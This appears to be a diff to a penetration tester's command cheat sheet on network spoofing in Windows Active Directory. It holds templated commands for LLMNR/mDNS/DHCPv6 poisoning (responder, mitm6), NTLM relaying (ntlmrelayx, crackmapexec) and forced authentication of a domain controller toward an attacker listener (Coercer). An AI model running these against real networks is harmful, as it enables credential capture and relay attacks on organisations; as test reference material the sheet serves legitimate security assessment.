@@ -1,6 +1,6 @@
 # Spoofing
 
-## Responder - LLMNR Poisoning
+## LLMNR Poisoning - responder
 
 ```
 responder-http-on
@@ -26,7 +26,7 @@ cme smb <target> --gen-relay-list <output_file>
 
 = target: $TARGETS/computers.list
 
-## Responder - Relay
+## LLMNR/MDNS/DHCP Poisoning - responder
 
 ```
 responder-http-off
@@ -36,7 +36,7 @@ responder -I <interface> -d -w
 
 = interface: enp0s31f6
 
-## NTLM Relay with SOCKS (SMB)
+## NTLM Relay with SOCKS (SMB) - ntlmrelayx
 
 ```
 ntlmrelayx -tf <targets_file> -socks -smb2support
@@ -44,7 +44,7 @@ ntlmrelayx -tf <targets_file> -socks -smb2support
 
 = targets_file: $TARGETS/relay_targets.list
 
-## mitm6 for NTLM Relay
+## DHCPv6 Poisoning - mitm6 
 
 ```
 mitm6 --interface <interface> --domain <domain>
@@ -52,3 +52,26 @@ mitm6 --interface <interface> --domain <domain>
 
 = interface: enp0s31f6
 = domain:
+
+## Check NTLMv1 - cme
+
+```
+cme smb <target> -d <domain> -u <user> -p <password> -M ntlmv1
+```
+
+= target: $DC
+= domain: $DOMAIN
+= user: $USER
+= password: $PASSWORD
+
+## Coercer - ESC8 / NTLMv1
+
+```
+coercer -d <domain> -u <user> -p <password> -l <listener> -t <target>
+```
+
+= domain: $DOMAIN
+= user: $USER
+= password: $PASSWORD
+= listener: $MY_IP
+= target: $DC
